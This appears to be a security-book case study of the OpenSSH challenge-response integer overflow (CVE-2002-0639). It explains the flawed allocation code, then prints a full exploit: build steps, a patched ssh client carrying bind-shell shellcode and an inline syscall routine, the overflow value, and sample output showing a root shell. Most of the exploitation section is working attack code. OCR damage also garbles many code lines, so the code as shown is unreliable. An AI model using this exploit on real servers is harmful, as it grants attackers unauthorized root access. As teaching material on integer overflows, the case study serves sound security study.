Case Study: OpenSSH challenge response integer overflow vulnerability cve-2002-0639
A vulnerability was discovered in the authentication sequence of the popular OpenSSH application. In order to exploit this vulnerability, the skey and bsdauth authentication mechanisms must be supported in the SSH server application. Most operating systems do not have these two options compiled into the server. However, OpenBSD has both of these features turned on by default.

Vulnerability details
This OpenSSH vulnerability is a perfect example of an integer overflow vulnerability. The vulnerability is caused by the following snippet of code:

1 nresp = packet_get_int( ) ;

2 if(nresp > 0) {

3 response - xraalloc (nresp * sizeof(char*});

4 for(i = 0 ;i < nresp;i + +) {

5 response[i]- packet_get_string(NULL);

6 }

7 }

An attacker has the ability to change the value of nresp (line 1) by modifying the code in the OpenSSH client. By modifying this value, one can change the amount of memory allocated by xmalloc (line 3). Specifying a large number for nresp, such as 0x40000400, prompts an integer overflow, causing xmalloc to allocate only 4096 bytes of memory. OpenSSH then proceeds to place values into the allocated pointer array (lines 4 through 6), dictated by the value of nresp (line 4), causing heap space to be overwritten with arbitrary data.

Exploitation details
Exploitation of this vulnerability is quite trivial. OpenSSH uses a multitude of function pointers for cleanup functions. All of these function pointers call code that is on the heap. By placing shellcode at one of these addresses, you can cause code execution, yielding remote root access.

Example output from sshd running in debug mode (sshd -ddd):

debug 1 : auth2_challenge_start : trying authentication method ‘bsdauth* Postponed keyboard-interactive for test from 127.0.0.1 port 19170 ssh2 buffer_get: trying to get more bytes 4 than in buffer 0 debugl: Calling cleanup 0x62000(0x0)

We can therefore cause arbitrary code execution by placing shellcode at the heap address 0x62000. This is trivial to accomplish and is performed by populating the heap space and copying assembly instructions directly.

Christophe Devine (devine@iie.cnam.fr) has written a patch for OpenSSH that includes exploit code. His patch and instructions follow.

Example 11.1
1 1. Download openssh-3.2.2pl.tar.gz and untar it

2

3 - $ tar -xvzf openssh-3.2.2pl.tar.gz

4

5 2. Apply the patch provided below by running:

6

7 ~/openssh-3 .2 . 2pl $ patch < path_to_dif f_file

8

9 3. Compile the patched client

10

11 -/openssh-3.2.2pl $ ./configure && make ssh

12

13 4. Run the evil ssh:

14

15 ~/openssh-3.2.2pl $ ./ssh root :skey@localhost

16

17 5. If the sploit worked, you can connect to port 128 in another terminal:

18

19 - $ nc localhost 128

20 uname -a

21 OpenBSD nice 3.1 GENERIC#59 Ì386

22 id

23 uid=0(root) gid=0(wheel) groups=0(wheel)

24

25 --- sshconnect2.cSun Mar 31 20:49:39 2002

26 + + + evil-sshconnect2.c     Fri Jun 28 19:22:12 2002

27 @@ -839,6 +839,56 @@

28 /*

29 * parse INFO_REQUEST, prompt user and send INFO_RESPONSE

30 */

31 +

32 +int do_syscall( int nb_args,int syscall_num,... );

33 +

34 +void shellcode( void )

35 +{

36 +      int server_sock, client_sock, len;

37 +      struct sockaddr_in server_addr;

38 +      char rootshell[12],*argv[2], *envp[l];

39 +

40 +      server_sock = do_syscall( 3,97, AF_INET, SOCK_STREAM,0 );

41 +      server_addr.sin_addr.s_addr = 0;

42 +      server_addr.sin_port = 32768;

43 +      server_addr. sin_f araily = AF_INET;

44 +      do_syscall( 3, 104, server_sock,(struct sockaddr *) &server_addr,

45 16 );

46 +      do_syscall( 2,106,server_sock,1 );

47 +      client_sock = do_syscall( 3,30,server_sock,(struct sockaddr *)

48 +      &server_addr, &len );

49 +      do_syscall( 2,90, client_sock,0 );

50 +      do_syscall( 2,90, client_sock,1 );

51 +      do_syscall( 2,90, client_sock, 2 );

52 +      *(int *)(rootshell + 0)= 0x6E69622F;

53 +      *(int *)( rootshell + 4 )= 0x0068732f;

54 +      *(int *)( rootshell + 8 )= 0;

55 +      argv[0] = rootshell;

56 +      argv[l]= 0;

57 +      envp[0] = 0;

58 +      do_syscall( 3,59, rootshell, argv, envp );

59 +}

60 +

61 +int do_syscall( int nb_args,int syscall_num,... }

62 +{

63 +      int ret;

64 +      asm (

65 +      “mov 8(%ebp),%eax; “

66 +      “add $3 , %eax; “

67 +      “shl $2,%eax; ■

68 +      “add %ebp,%eax; “

69 +      “mov 8(%ebp),%ecx; “

70 +      “push_args: “

71 +      “push(%eax) ; “

72 +      “sub $4 ,%eax; “

73 +      “looppush_args ; “

74 +      “mov 12(%ebp),%eax; “

75 +      “push$0; “

76 +      “int $0x80; “

77 +      “mov%eax,-4 (%ebp) “

78 + };

79 +      return( ret );

80 +i

81 +

82 void

83 input_userauth_info_req(int type,u_int32_t seq,void *ctxt)

84 {

85 @@ -865,7 +915,7 @@

86 xf ree ( inst) ,-

87 xfree(lang);

88

89 - num_prompts - packet_get_int();

90 +      num_prompts = 1073741824 + 1024;

91 /*

92 * Begin to build info response packet based on prompts requested.

93 * We commit to providing the correct number of responses,so if

94 @8 -874,6 +924,13 S@

95 */

96 packet_start[SSH2_MSG_USERAUTH_INFO_RESPONSE);

97 packet put int(num prompts);

98 +

99 +for( i = 0;i < 1045;i++ )

100 +      packet_put_cstring{“xxxxxxxxxx”);

101 +

102 + packet_put_string( shellcode, 2047 );

103 +      packet_send() ;

104 +      return ;

105

106 debug2(“input_userauth_info_req: num_prompts %d”, num_prompts);

107 for (i = 0; i < num_prompts; i++) {

Here is a full exploitation example using a modified ssh client containing exploit code:

1 $ ssh root :skey@127.0.0.1&

2 $ telnet 127.0.0.1 128

3 id;

4 uid=0 (root) gid=0 (wheel)

5

This exploit sets the value of the nresp variable to 0x40000400, causing malloc to allocate 4096 bytes of memory. At the same time, the the loop continues to copy data past the allocated buffer onto the heap space. OpenSSH uses many function pointers that are found on the heap following the allocated buffer. This exploit then proceeds to copy the shellcode directly onto the heap in hopes that it will be executed by the SSH cleanup functions, which is the case most of the time.
